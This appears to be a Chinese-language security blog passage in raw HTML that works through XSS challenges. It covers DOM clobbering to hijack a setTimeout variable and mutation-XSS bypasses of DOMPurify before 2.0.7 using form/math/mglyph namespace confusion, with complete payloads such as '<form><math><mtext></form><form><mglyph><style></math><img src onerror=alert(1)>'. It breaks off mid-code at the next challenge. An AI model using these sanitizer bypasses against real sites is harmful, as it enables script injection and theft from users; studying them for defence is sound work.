class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">embed</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;c&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;d&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">c</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过 html 影响 js</p>\n<p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>\n<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 [object HTMLInputElement]。</p>\n<p>关于问题 1)</p>\n<p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=test1&gt;</span><br><span class=\"line\">  &lt;input name=test2&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>可以通过 name 取值，但取到的值是对象，即引出问题 2)</p>\n<p>js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链</p>\n<p>一般来说，对象的 <code>valueof</code>  方法总是返回对象自身，这时再自动调用对象的 <code>tostring</code>  方法，将其转为字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; p: 1 &#125;;</span><br><span class=\"line\">obj.valueof().tostring() // &quot;[object object]&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对象的 <code>tostring</code>  方法默认返回 <code>[object object]</code> ，所以就得到了最前面那个例子的结果。</p>\n<p>通过遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义</p>\n<p>一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义。如果它们不继承自 <code>Object.prototype</code> ，那么可能 <code>[object SomeElement]</code>  会返回其他东西。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.getOwnPropertyNames(window)   //获取Window下object所有属性</span><br><span class=\"line\">.filter(p =&gt; p.match(/Element$/))   //匹配以element结尾的属性</span><br><span class=\"line\">.map(p =&gt; window[p])</span><br><span class=\"line\">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素</span><br></pre></td></tr></table></figure>\n<p>得到结果 <code>HTMLAreaElement</code> （ <code>&lt;area&gt;</code> ）和 <code>HTMLAnchorElement</code> （ <code>&lt;a&gt;</code> ）这两个元素不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1 href=https://securitum.com&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1); // alerts &quot;https://securitum.com&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容</p>\n<p>但是以下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (window.test1.test2) &#123;</span><br><span class=\"line\">    eval(&#x27;&#x27;+window.test1.test2)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果为 undefined</p>\n<p>假设有两个 id 一样的元素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， <code>window.test1.test1</code>  实际上是指第一个元素，但无法取到第二个元素</p>\n<p>如果想取到第二个元素，需要给第二个元素加 name 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>我们可以通过 name 访问第二个 a <code>window.test1.test2</code></p>\n<p>通过给第二个 a 加 href 控制弹出内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;x:alert(1)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但 x 不是标准协议，需要使用协议比如 <code>tel,mailto,cid,javascript</code>  等</p>\n<p>即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k\">📎Ok, Boomer.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    boomer.<span class=\"property\">innerHTML</span> = <span class=\"title class_\">DOMPurify</span>.<span class=\"title function_\">sanitize</span>(<span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;boomer&#x27;</span>) || <span class=\"string\">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"built_in\">setTimeout</span>(ok, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>\n<p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>\n<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如<div id=\"ok\"></div></p>\n<p>然后，ok 需要接受一个字符串作为值，而在对<a>标签调用 toString () 方法时，会返回属性 href 的值，所以，我们可以选择<a>标签作为构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>\n<p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a%20id=ok%20href=mailto:alert(1337)&gt;</span><br><span class=\"line\">?boomer=&lt;a%20id=ok%20href=tel:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>由于劫持了 settimeout，因此会延迟两秒执行</p>\n<p>通过两个 id 可以取到的标签：</p>\n<p>form,button</p>\n<p>form,fieldset</p>\n<p>form,image</p>\n<p>form,img</p>\n<p>form,input</p>\n<p>form,object</p>\n<p>form,output</p>\n<p>form,select</p>\n<p>form,textarea</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">\t&lt;img id=y&gt;</span><br><span class=\"line\">console.log(x.y)  //&lt;img id=y&gt;</span><br></pre></td></tr></table></figure>\n<p>通过三层嵌套取到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">&lt;form id=x name=y&gt;</span><br><span class=\"line\">&lt;input id=z&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">window.x.y.z.value</span><br></pre></td></tr></table></figure>\n<p>unintended solution</p>\n<p>利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &lt; 2.0.7</p>\n<p>前置知识：</p>\n<p>1.DOMPurify 的典型用法使 HTML 标记被解析两次。</p>\n<p>dompurify 使用语句如下</p>\n<p><code>div.innerHTML = DOMPurify.sanitize(htmlMarkup)</code></p>\n<p>在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：</p>\n<ol>\n<li><code>htmlMarkup</code>  <strong>被解析为 DOM 树</strong>。</li>\n<li>DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。</li>\n<li>DOM 树<strong>被序列化回 HTML 标记</strong>。</li>\n<li>分配给 后 <code>innerHTML</code> ，浏览器会<strong>再次解析 HTML 标记</strong>。</li>\n<li>解析后的 DOM 树被附加到文档的 DOM 树中。</li>\n</ol>\n<p>假设我们的初始 html 是 <code>A&lt;img src=1 onerror=alert(1)&gt;B</code> 。在第一步中，它被解析为以下树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png\" alt=\"\"></p>\n<p>然后，DOMPurify 对其进行清理，留下以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png\" alt=\"\"></p>\n<p>然后它被序列化为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A&lt;img src=&quot;1&quot;&gt;B</span><br></pre></td></tr></table></figure>\n<p>这就是 <code>DOMPurify.sanitize</code>  的返回值。然后浏览器在分配给 innerHTML 时再次解析：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-3-1536x161.png\" alt=\"\"></p>\n<p>DOM 树与 DOMPurify 处理的树相同，然后附加到文档中。</p>\n<p>所以附加到文档之前需要解析 - 序列化 - 解析。但<strong>两次解析的 DOM 树未必相同</strong>。</p>\n<p>2.HTML 规范有一个问题，它使得创建嵌套 <code>form</code>  元素成为可能。但是，在重新解析时，第二个 <code>form</code>  将消失。</p>\n<p>html 规范中，不允许 form 元素的子元素是 form。那么说明嵌套 form 元素是不被允许的。这会导致嵌套里面的 form 元素被 html 解析器忽略。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=form1&gt;</span><br><span class=\"line\">INSIDE_FORM1</span><br><span class=\"line\">&lt;form id=form2&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-5-1536x121.png\" alt=\"\"></p>\n<p>我们可以通过带有错误嵌套标签的稍微损坏的标记，可以创建嵌套表单。</p>\n<p><code>&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;/form&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;</code></p>\n<p>它产生以下 DOM 树，其中包含一个嵌套的表单元素：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-6-1536x211.png\" alt=\"\"></p>\n<p>这不是任何特定浏览器中的错误；它直接来自 HTML 规范，并在解析 HTML 的算法中进行了描述。这是一般的想法：</p>\n<ul>\n<li>当你打开一个 <code>&lt;form&gt;</code>  标签时，解析器需要使用<strong>表单元素指针</strong>打开的（在规范中是这样调用的）。如果指针不是 <code>null</code> ，则 <code>form</code>  无法创建元素。</li>\n<li>结束 <code>&lt;form&gt;</code>  标记时，表单元素指针始终设置为 <code>null</code> 。</li>\n</ul>\n<p>注意：一般来说子元素是要紧贴父元素的</p>\n<p>现在，如果我们尝试序列化生成的 DOM 树，我们将得到以下标记：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;outer&quot;&gt;&lt;div&gt;&lt;form id=&quot;inner&quot;&gt;&lt;input&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-7-1536x151.png\" alt=\"\"></p>\n<p>所以这证明了序列化后再次解析不能保证返回原始 DOM 树，同时再次解析后内层 form 消失了</p>\n<p>3. 外部内容</p>\n<p>HTML 解析器可以创建一个包含三个命名空间元素的 DOM 树：</p>\n<ul>\n<li>HTML 命名空间</li>\n<li>SVG 命名空间</li>\n<li>MathML 命名空间 ，是 XML 语言的子集 zhangxinxu</li>\n</ul>\n<p>默认情况下，所有元素都在 HTML 命名空间中；但是，如果解析器遇到 <code>&lt;svg&gt;</code> or <code>&lt;math&gt;</code>  元素，则它分别 “切换” 到 SVG 和 MathML 命名空间。并且这两个命名空间都会产生外部内容。</p>\n<p>在外部内容中，标记的解析方式与普通 HTML 不同。这可以在解析 <code>&lt;style&gt;</code>  元素时清楚地显示出来。在 HTML 命名空间中， <code>&lt;style&gt;</code>  只能包含文本；没有后代，并且不解码 HTML 实体。外部内容并非如此：外部内容 <code>&lt;style&gt;</code>  可以有子元素，并且实体被解码。</p>\n<p><code>&lt;style&gt;&lt;a&gt;ABC&lt;/style&gt;&lt;svg&gt;&lt;style&gt;&lt;a&gt;ABC</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8-1536x308.png\" alt=\"\"></p>\n<p>证明了 svg 命名空间中的 style 可以被解析</p>\n<p>如果我们在里面 <code>&lt;svg&gt;</code> ， <code>&lt;math&gt;</code>  那么所有元素也都在非 HTML 命名空间中。但是这是错误的。HTML 规范中有一些元素称为<strong> MathML 文本集成点</strong>和<strong> HTML 集成点</strong>。这些元素的子元素具有 HTML 命名空间</p>\n<p><code>&lt;math&gt;&lt;style&gt;&lt;a&gt;A&lt;/style&gt;&lt;mtext&gt;&lt;style&gt;&lt;a&gt;B&lt;/style&gt;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9-1536x207.png\" alt=\"\"></p>\n<p>请注意 <code>style</code>  作为 math 的直接子元素 <code>在 MathML 命名空间中，而</code> 第二个 style <code>在mtext下则是 HTML 命名空间中。这是因为</code>  mtext` 是<strong> MathML 文本集成点</strong>并使解析器切换命名空间。</p>\n<p>MathML 文本集成点是：</p>\n<ul>\n<li><code>math mi</code></li>\n<li><code>math mo</code></li>\n<li><code>math mn</code></li>\n<li><code>math ms</code></li>\n</ul>\n<p>HTML 集成点是：</p>\n<ul>\n<li><code>math annotation-xml</code>  如果它有一个名为的属性， <code>encoding</code>  其值等于 <code>text/html</code>  或  <code>application/xhtml+xml</code></li>\n<li><code>svg foreignObject</code></li>\n<li><code>svg desc</code></li>\n<li><code>svg title</code></li>\n</ul>\n<p>但并不是所有 mathml 文本集成点和 html 集成点子元素都是 html 命名空间的</p>\n<p>html 规范中，大部分 Mathml 文本集成点的子元素都是 HTML 命名空间的啊，但是除了<mglyph><malignmark>。当这两直接是 Mathml 文本集成点的直接子元素的时候。他们不会切换命名空间。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-10-1536x252.png\" alt=\"\"></p>\n<p>最终 payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>使用以上所有内容，我们可以创建一个包含两个 <code>form</code>  元素和 <code>mglyph</code>  元素的标记，该标记最初位于 HTML 命名空间中，但在重新解析它时位于 MathML 命名空间中，从而使后续 <code>style</code>  标记的解析方式不同并导致 XSS。</p>\n<p>payload 利用错误嵌套的 <code>html form</code>  元素，并且还包含 <code>mglyph</code>  元素。它生成以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-11-1536x326.png\" alt=\"\"></p>\n<p>这个 DOM 树是无害的。所有元素都在 DOMPurify 的允许列表中。请注意，这 <code>mglyph</code>  是在 HTML 命名空间中。看起来像 XSS playload 的片段只是 <code>html style</code> . 因为有一个嵌套的 <code>html form</code> ，我们可以非常确定这个 DOM 树将在重新解析时发生变异。</p>\n<p>序列化之后的 html 是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p>此代码段具有嵌套 <code>form</code>  标签。所以当它被赋值给 时 <code>innerHTML</code> ，它会被解析成下面的 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-12-1536x312.png\" alt=\"\"></p>\n<p>所以现在第二个 <code>html form</code>  没有被创建， <code>mglyph</code>  现在是 mtext 的直接子元素，在 MathML 命名空间中。因此， <code>style</code>  它也在 MathML 命名空间中，因此其内容不被视为文本。然后 <code>&lt;/math&gt;</code>  关闭 <code>&lt;math&gt;</code>  元素，现在 <code>img</code>  在 HTML 命名空间中创建，导致 XSS。</p>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;table id=&quot;&lt;/table&gt;&quot;&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104652050.png\" alt=\"image-20221009104652050\"></p>\n<p>经过二次解析后为</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009104805809.png\" alt=\"image-20221009104805809\"></p>\n<h2 id=\"ww3\"><a class=\"markdownIt-Anchor\" href=\"#ww3\">#</a> WW3</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k\">📎World War 3.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>Meme Code<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;form-control&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;meme-code&quot;</span> <span class=\"attr\">rows</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;notify&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    /* Utils */</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const escape = (dirty) =&gt; unescape(dirty).replace(/[<span class=\"tag\">&lt;&gt;</span>&#x27;&quot;=]/g, &#x27;&#x27;);</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeTemplate = (img, text) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        return (`<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"><span class=\"keyword\">@import</span> url(<span class=\"string\">&#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&#x27;</span>);`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&#123;<span class=\"attribute\">margin</span>:<span class=\"number\">0</span> auto;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">img</span>&#123;<span class=\"attribute\">width</span>:<span class=\"number\">300px</span>&#125;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"selector-class\">.meme-card</span>&gt;<span class=\"selector-tag\">h1</span>&#123;<span class=\"attribute\">text-align</span>:center;<span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;<span class=\"attribute\">background</span>:black;<span class=\"attribute\">margin-top</span>:-<span class=\"number\">5px</span>;`+</span></span></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"attribute\">position</span>:relative;<span class=\"attribute\">font-family</span>:Oswald,sans-serif;<span class=\"attribute\">font-weight</span>:<span class=\"number\">700</span>&#125;</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span>`+</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">            `<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;meme-card&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;$&#123;img&#125;&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>$&#123;text&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`)</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">    const memeGen = (that, notify) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-handlebars\">        if (text &amp;&amp; img) 